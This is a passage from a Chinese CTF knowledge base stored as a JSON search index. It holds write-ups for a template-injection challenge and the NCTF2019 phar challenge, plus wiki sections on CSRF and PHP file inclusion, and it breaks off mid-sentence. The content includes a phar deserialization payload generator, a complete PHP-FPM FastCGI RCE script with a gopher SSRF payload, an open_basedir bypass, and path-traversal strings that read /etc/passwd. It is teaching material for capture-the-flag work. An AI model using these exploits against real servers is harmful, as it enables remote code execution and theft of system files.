<p>\u53ef\u4ee5\u7f16\u8f91\u5168\u5c40\u6587\u4ef6\u7684\u5934\uff0c\u53ef\u4ee5\u770b\u51fa{}\u5305\u88f9\u7684nei\u5bb9\u56de\u88ab\u5f53\u6210\u662fphp\u4ee3\u7801\u6267\u884c\uff0c\u7c7b\u4f3c\u67d0\u79cd\u6a21\u677f</p> <p>\u70b9\u4fdd\u5b58\u7684\u65f6\u5019\u7ed9\u51fa\u4e86\u66f4\u4e3a\u5947\u602a\u7684\u8def\u5f84\uff0c\u4e5f\u5c31\u662f\u8bf4\u8981\u521b\u5efa\u4e00\u4e2a\u8fd9\u6837\u7684\u8def\u5f84\u3002</p> <p></p> <p>\u7531\u4e8e\u76ee\u524d\u8def\u5f84\u5728 /var/www/html/system/tmp/template/default/common/header.html.php\u4e4b\u4e0b\uff0c\u9700\u8981\u627e\u4e2a\u8def\u5f84\u7a7f\u8d8a\u7684\u70b9\u3002</p> <p>\u7136\u540e\u5c31\u6709\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u90a3\u5757</p> <p>\u7f16\u8f91\u6210\u8fd9\u4e2a\u6837\u5b50\uff08\u81ea\u52a8\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\uff09</p> <p>\u6700\u540e\u5728\u6a21\u677f\u4e2d\u6dfb\u52a0{!echo(system('cat /flag'))}</p> <p>\u8bbf\u95ee\u524d\u53f0\u5373\u53ef\u3002</p> <p></p>"},{"location":"web_bak/ctf/%5BNCTF2019%5Dphar_matches_everything/","title":"[NCTF2019]phar matches everything","text":"<p>[NCTF2019]phar matches everything</p> <p>\u8fd9\u9898\u505a\u4e86\u6211\u5f88\u4e45\u5f88\u4e45\uff0c\u4f46\u73b0\u5728\u56de\u60f3\u8d77\u6765\u8fd8\u662f\u5341\u5206\u6709\u6536\u83b7</p> <p>\u957f\u94fe\u7684\u9898\u76ee\u4f1a\u7565\u663e\u7e41\u7410\u3002</p> <p>\u7ed9\u51fa\u6e90\u7801\uff1a</p> <pre><code>//catchmime.php\n&lt;?php\nclass Easytest{\nprotected $test;\npublic function funny_get(){\nreturn $this-&gt;test;\n}\n}\nclass Main {\npublic $url;\npublic function curl($url){\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,$url);\ncurl_setopt($ch,CURLOPT_RETURNTRANSFER,true);\n$output=curl_exec($ch);\ncurl_close($ch);\nreturn $output;\n}\n\npublic function __destruct(){\n$this_is_a_easy_test=unserialize($_GET['careful']);\nif($this_is_a_easy_test-&gt;funny_get() === '1'){\necho $this-&gt;curl($this-&gt;url);\n}\n}\n}\n\nif(isset($_POST[\"submit\"])) {\n$check = getimagesize($_POST['name']);\nif($check !== false) {\necho \"File is an image - \" . $check[\"mime\"] . \".\";\n} else {\necho \"File is not an image.\";\n}\n}\n?&gt;\n</code></pre> <p>\u6211\u4eec\u6765\u597d\u53f7\u770b\u770b\u6e90\u4ee3\u7801\uff0c\u5173\u6ce8\u70b9\u5728\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u3002</p> <ul> <li>curl\u51fd\u6570\u53ef\u4ee5\u8fdb\u884cssrf\u6216\u8005\u4efb\u610f\u6587\u4ef6\u8bfb\uff08file\u4f2a\u534f\u8bae\uff09</li> <li>getimagessize\u51fd\u6570\u7684\u7ed5\u8fc7\uff08GIF89A\u5934\uff09</li> <li>\u4e24\u4e2a\u7c7b\uff0c\u6784\u6790\u51fd\u6570\uff0cserialize\u51fd\u6570\uff08\u53cd\u5e8f\u5217\u5316\uff09</li> </ul> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\u5728\u54ea\u3002</p> <p>\u7b54\u6848\u65f6phar\u4f2a\u534f\u8bae\u5728\u53cd\u5e8f\u5217\u5316\u4e2d\u7684\u8fd0\u7528\uff0c\u56e0\u4e3aphar\u540e\u7f00\u7684\u6587\u4ef6\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\uff0c\u518d\u5229\u7528phar://\u4f2a\u534f\u8bae\u8bfb\u53d6\u5185\u5bb9\u65f6\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528unserialize()\u51fd\u6570\uff0c\u6210\u4e3a\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\uff0c\u6700\u540e\u8fdb\u5165__destruct\u51fd\u6570\u4e2d\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b65\u662fphar\u7684\u53cd\u5e8f\u5217\u5316\u70b9\u3002</p> <p>\u53cd\u5e8f\u5217\u5316\u7684\u94fe\u662fphar://------&gt;careful=(\u8c03\u7528funny_get())------&gt;curl\u8c03\u7528\uff0c\u8fd9\u91cc\u5176\u5b9e\u662f\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u3002phar\u7684\u811a\u672c\u683c\u5f0f\u4f1a\u6bd4\u8f83\u56fa\u5b9a\uff0c\u4e0b=\u4e0b\u9762\u7684\u811a\u672c\u4e5f\u53ef\u4ee5\u5f53\u6210\u662f\u6a21\u677f\u6765\u4f7f\u7528\u3002\u800c\u4e14\u770b\u8d77\u6765\u4e5f\u8fd8\u662f\u86ee\u7b80\u5355\u7684\u3002</p> <pre><code>&lt;?php\nclass Easytest{\nprotected $test='1';\npublic function funny_get(){\nreturn $this-&gt;test;\n}\n}\nclass Main {\npublic $url;\n}\n\n\n$test = new EasyTest;\necho urlencode(serialize($test)).\"\\n\";\n\n$payload = new Main;\n$payload-&gt;url = \"file:///etc/passwd\";//\u6587\u4ef6\u6d41\u8bfb\u53d6\u6587\u4ef6\n\n$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');//GIF89A\u5934\n$phar = new Phar('exp.phar');\n$phar -&gt; startBuffering();\n$phar -&gt; setStub($png_header.'&lt;?php __HALT_COMPILER();?&gt;');\n$phar -&gt; addFromString('test.txt','test');\n$phar -&gt; setMetadata($payload);\n$phar -&gt; stopBuffering();\nrename(\"exp.phar\",\"exp.png\");//\u7531\u4e8e\u4e0a\u4f20\u6587\u4ef6\u6709\u540e\u7f00\u9650\u5236\u6539\u4e3apng\n?&gt;\n</code></pre> <p>\u6210\u529f\u4e4b\u540e\u80fd\u591f\u8bfb\u5230etc/passwd\u4e2d\u7684\u5185\u5bb9\u3002</p> <p>\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e1c\u897f\uff0c\u770b\u4e86\u4e0bwp(/etc/hosts)</p> <p>\u548c\u8bf4\u597d\u7684\u4e0d\u4e00\u6837\uff08\u607c\uff09</p> <p>\u7f51\u4e0a\u67e5\u4e86\u4e00\u4e0b\u8fd8\u6709\u4ec0\u4e48\u522b\u7684\u8bfbip\u7684\u4e1c\u897f\u6ca1\u6709\uff0c\u53d1\u73b0\u5728/proc/net/arp\u4e0b\u53d1\u73b0\u4e86\u5185\u7f51ip</p> <p></p> <p>\u5229\u7528http://10.0.16.11 \uff08\u4fee\u6539file://\u90a3\u91cc\uff09\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u5f97\u5230\u4e86\u4e00\u4e2aPHP-FPM\u7684\u63d0\u793a</p> <p>\u63a5\u4e0b\u6765\u662fphp-fpm\u8ba4\u8bc1\u653b\u51fb\uff08\u653e\u5728\u53e6\u5916\u7684\u6587\u6863\u91cc\u9762\uff09</p> <pre><code>import socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\nimport base64\nimport urllib\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\nPY2 = True if sys.version_info.major == 2 else False\ndef bchr(i):\nif PY2:\nreturn force_bytes(chr(i))\nelse:\nreturn bytes([i])\ndef bord(c):\nif isinstance(c, int):\nreturn c\nelse:\nreturn ord(c)\ndef force_bytes(s):\nif isinstance(s, bytes):\nreturn s\nelse:\nreturn s.encode('utf-8', 'strict')\ndef force_text(s):\nif issubclass(type(s), str):\nreturn s\nif isinstance(s, bytes):\ns = str(s, 'utf-8', 'strict')\nelse:\ns = str(s)\nreturn s\nclass FastCGIClient:\n\"\"\"A Fast-CGI Client for Python\"\"\"\n# private\n__FCGI_VERSION = 1\n__FCGI_ROLE_RESPONDER = 1\n__FCGI_ROLE_AUTHORIZER = 2\n__FCGI_ROLE_FILTER = 3\n__FCGI_TYPE_BEGIN = 1\n__FCGI_TYPE_ABORT = 2\n__FCGI_TYPE_END = 3\n__FCGI_TYPE_PARAMS = 4\n__FCGI_TYPE_STDIN = 5\n__FCGI_TYPE_STDOUT = 6\n__FCGI_TYPE_STDERR = 7\n__FCGI_TYPE_DATA = 8\n__FCGI_TYPE_GETVALUES = 9\n__FCGI_TYPE_GETVALUES_RESULT = 10\n__FCGI_TYPE_UNKOWNTYPE = 11\n__FCGI_HEADER_SIZE = 8\n# request state\nFCGI_STATE_SEND = 1\nFCGI_STATE_ERROR = 2\nFCGI_STATE_SUCCESS = 3\ndef __init__(self, host, port, timeout, keepalive):\nself.host = host\nself.port = port\nself.timeout = timeout\nif keepalive:\nself.keepalive = 1\nelse:\nself.keepalive = 0\nself.sock = None\nself.requests = dict()\ndef __connect(self):\nself.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself.sock.settimeout(self.timeout)\nself.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# if self.keepalive:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n# else:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\ntry:\nself.sock.connect((self.host, int(self.port)))\nexcept socket.error as msg:\nself.sock.close()\nself.sock = None\nprint(repr(msg))\nreturn False\nreturn True\ndef __encodeFastCGIRecord(self, fcgi_type, content, requestid):\nlength = len(content)\nbuf = bchr(FastCGIClient.__FCGI_VERSION) \\\n+ bchr(fcgi_type) \\\n+ bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(requestid &amp; 0xFF) \\\n+ bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(length &amp; 0xFF) \\\n+ bchr(0) \\\n+ bchr(0) \\\n+ content\nreturn buf\ndef __encodeNameValueParams(self, name, value):\nnLen = len(name)\nvLen = len(value)\nrecord = b''\nif nLen &lt; 128:\nrecord += bchr(nLen)\nelse:\nrecord += bchr((nLen &gt;&gt; 24) | 0x80) \\\n+ bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(nLen &amp; 0xFF)\nif vLen &lt; 128:\nrecord += bchr(vLen)\nelse:\nrecord += bchr((vLen &gt;&gt; 24) | 0x80) \\\n+ bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(vLen &amp; 0xFF)\nreturn record + name + value\ndef __decodeFastCGIHeader(self, stream):\nheader = dict()\nheader['version'] = bord(stream[0])\nheader['type'] = bord(stream[1])\nheader['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\nheader['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\nheader['paddingLength'] = bord(stream[6])\nheader['reserved'] = bord(stream[7])\nreturn header\ndef __decodeFastCGIRecord(self, buffer):\nheader = buffer.read(int(self.__FCGI_HEADER_SIZE))\nif not header:\nreturn False\nelse:\nrecord = self.__decodeFastCGIHeader(header)\nrecord['content'] = b''\nif 'contentLength' in record.keys():\ncontentLength = int(record['contentLength'])\nrecord['content'] += buffer.read(contentLength)\nif 'paddingLength' in record.keys():\nskiped = buffer.read(int(record['paddingLength']))\nreturn record\ndef request(self, nameValuePairs={}, post=''):\nif not self.__connect():\nprint('connect failure! please check your fasctcgi-server !!')\nreturn\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nself.sock.send(request)\nself.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\nself.requests[requestId]['response'] = b''\nreturn self.__waitForResponse(requestId)\ndef gopher(self, nameValuePairs={}, post=''):\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nreturn request\ndef __waitForResponse(self, requestId):\ndata = b''\nwhile True:\nbuf = self.sock.recv(512)\nif not len(buf):\nbreak\ndata += buf\ndata = BytesIO(data)\nwhile True:\nresponse = self.__decodeFastCGIRecord(data)\nif not response:\nbreak\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\nor response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nself.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\nif requestId == int(response['requestId']):\nself.requests[requestId]['response'] += response['content']\nif response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\nself.requests[requestId]\nreturn self.requests[requestId]['response']\ndef __repr__(self):\nreturn \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\nparser.add_argument('host', help='Target host, such as 127.0.0.1')\nparser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\nparser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;')\nparser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\nparser.add_argument('-e', '--ext', help='ext absolute path', default='')\nparser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')\nparser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)\nparser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)\nargs = parser.parse_args()\nclient = FastCGIClient(args.host, args.port, 3, 0)\nparams = dict()\ndocumentRoot = \"/\"\nuri = args.file\nparams = {\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'POST',\n'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n'SCRIPT_NAME': uri,\n'QUERY_STRING': '',\n'REQUEST_URI': uri,\n'DOCUMENT_ROOT': documentRoot,\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '9985',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1',\n'CONTENT_TYPE': 'application/text',\n'CONTENT_LENGTH': \"%d\" % len(args.code),\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\nif args.ext and args.include_file:\n#params['PHP_ADMIN_VALUE']='extension = '+args.ext\nparams['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\"\nparams['PHP_VALUE']='auto_prepend_file = '+args.include_file\nif not args.url_format and not args.base64_format :\nresponse = client.request(params, args.code)\nprint(force_text(response))\nelse:\nresponse = client.gopher(params, args.code)\nif args.url_format:\nprint(urllib.quote(response))\nif args.base64_format:\nprint(base64.b64encode(response))\n</code></pre> <p>\u50bb\u74dc\u5f0f\u4f7f\u7528\u65b9\u6cd5\uff1a</p> <pre><code>python2 exp 10.0.16.11 /var/www/html/index.php -p 9000 -c \"&lt;?php phpinfo();?&gt;\" -u\n</code></pre> <p>\u751f\u6210\u7684\u6587\u4ef6\u5199\u5165\uff0c\u5229\u7528gopher\u534f\u8bae\uff1a</p> <pre><code>gopher://10.0.16.11:9000/_%01%01%D8%D3%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D8%D3%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D8%D3%00%00%00%00%01%05%D8%D3%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D8%D3%00%00%00%00\n</code></pre> <p>\u518d\u8bfb\u6587\u4ef6\uff1a</p> <p></p> <p>\uff08\u719f\u6089\u4e00\u70b9\u8fd9\u5c31\u662fphpinfo()\uff09\uff0c\u4e0b\u6b21\u518d\u7f51\u9875\u4e2d\u6253\u5f00\uff0c\u770b\u4e00\u4e0b\u654f\u611f\u4fe1\u606f\u3002</p> <p>open_basedir\u7ed5\u8fc7</p> <p>\u5c06\u6307\u4ee4\u6539\u4e3a\uff1a</p> <pre><code>&lt;?php mkdir('/tmp/fuck');chdir('/tmp/fuck');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));readfile('/flag');?&gt;\n</code></pre> <p>\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u6700\u540ephar://\u8bfb\u5230flag</p>"},{"location":"web_bak/ctf-wiki-web/CSRF/","title":"CSRF","text":""},{"location":"web_bak/ctf-wiki-web/CSRF/#csrf","title":"CSRF \u7b80\u4ecb\u00b6","text":"<p>CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002</p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#csrf_1","title":"CSRF \u7c7b\u578b\u00b6","text":"<p>\u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002</p> <p>\u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#html-csrf","title":"HTML CSRF\u00b6","text":"<p>\u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002</p> <p>HTML \u4e2d\u80fd\u8bbe\u7f6e<code>src/href</code>\u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a</p> <p><pre><code>&lt;link href=\"\"&gt;\n&lt;img src=\"\"&gt;\n&lt;img lowsrc=\"\"&gt;\n&lt;img dynsrc=\"\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\"&gt;\n&lt;iframe src=\"\"&gt;\n&lt;frame src=\"\"&gt;\n&lt;script src=\"\"&gt;&lt;/script&gt;\n&lt;bgsound src=\"\"&gt;&lt;/bgsound&gt;\n&lt;embed src=\"\"&gt;&lt;/bgsound&gt;\n&lt;video src=\"\"&gt;&lt;/video&gt;\n&lt;audio src=\"\"&gt;&lt;/audio&gt;\n&lt;a href=\"\"&gt;&lt;/a&gt;\n&lt;table background=\"\"&gt;&lt;/table&gt;\n......\n</code></pre> \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a <pre><code>@import \"\"\nbackground:url(\"\")\n......\n</code></pre> \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002 <pre><code>&lt;form action=\"http://www.a.com/register\" id=\"register\" method=\"post\"&gt;\n&lt;input type=text name=\"username\" value=\"\" /&gt;\n&lt;input type=password name=\"password\" value=\"\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\nvar f = document.getElementById(\"register\");\nf.inputs[0].value = \"test\";\nf.inputs[1].value = \"passwd\";\nf.submit();\n&lt;/script&gt;\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#flash-csrf","title":"Flash CSRF\u00b6","text":"<p>Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002</p> <p><pre><code>import flash.net.URLRequest;\nimport flash.system.Security;\nvar url = new URLRequest(\"http://target/page\");\nvar param = new URLVariables();\nparam = \"test=123\";\nurl.method = \"POST\";\nurl.data = param;\nsendToURL(url);\nstop();\n</code></pre> Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>getURL</code>\u3001<code>loadVars</code>\u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002 <pre><code>req = new LoadVars();\nreq.addRequestHeader(\"foo\", \"bar\");\nreq.send(\"http://target/page?v1=123&amp;v2=222\", \"_blank\", \"GET\");\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#csrf_2","title":"CSRF \u7684\u9632\u5fa1\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/CSRF/#_1","title":"\u9a8c\u8bc1\u7801\u00b6","text":"<p>\u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002</p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#referer-check","title":"Referer Check\u00b6","text":"<p>\u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002</p>"},{"location":"web_bak/ctf-wiki-web/CSRF/#token","title":"Token\u00b6","text":"<p>CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002</p> <p>\u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002</p> <p>Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002</p> <p>Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/","title":"PHP","text":""},{"location":"web_bak/ctf-wiki-web/PHP/#_2","title":"\u6587\u4ef6\u5305\u542b\u00b6","text":"<p>\u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a</p> <ul> <li>PHP\uff1a<code>include()</code>\uff0c<code>include_once()</code>\uff0c<code>require()</code>\uff0c<code>require_once()</code>\uff0c<code>fopen()</code>\uff0c<code>readfile()</code>\u7b49</li> <li>JSP Servlet\uff1a<code>ava.io.File()</code>\uff0c<code>java.io.FileReader()</code>\u7b49</li> <li>ASP\uff1a<code>includefile</code>\uff0c<code>includevirtual</code>\u7b49</li> </ul> <p>\u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_3","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b\u00b6","text":"<p>\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002</p> <p><pre><code>&lt;?php\n$file = $_GET['file'];\nif (file_exists('/home/wwwrun/'.$file.'.php')) {\ninclude '/home/wwwrun/'.$file.'.php';\n}\n?&gt;\n</code></pre> \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6<code>/etc/passwd</code>\u6587\u4ef6\u5185\u5bb9\u3002 * <code>%00</code>\u622a\u65ad <pre><code>?file=../../../../../../../../../etc/passwd%00\n</code></pre> \u9700\u8981<code>magic_quotes_gpc=off</code>\uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002 * \u8def\u5f84\u957f\u5ea6\u622a\u65ad <pre><code>?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././.\n</code></pre> Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 